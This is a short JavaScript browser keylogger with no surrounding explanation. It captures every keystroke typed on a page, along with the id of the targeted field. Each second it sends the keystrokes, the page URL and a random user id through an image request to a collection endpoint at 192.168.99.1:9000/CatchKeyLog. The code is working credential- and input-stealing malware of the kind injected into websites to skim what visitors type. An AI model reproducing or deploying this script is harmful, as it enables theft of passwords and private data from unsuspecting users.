var keys='';
var object = '';
var uid = '';
document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
	object = e.target.id
}

(function() {
	function s4() {
	    return Math.floor((1 + Math.random()) * 0x10000)
	      .toString(16)
	      .substring(1);
	  }
	  uid = s4() + s4() + '-' + s4() + '-' + s4() + '-' + s4() + '-' + s4() + s4() + s4();
})();


window.setInterval(function(){
	console.log("object" + object)
	new Image().src = 'http://192.168.99.1:9000/CatchKeyLog?userid='+uid+'data='+keys+'&page='+window.location.href+'&object='+object ;
	keys = '';
}, 1000);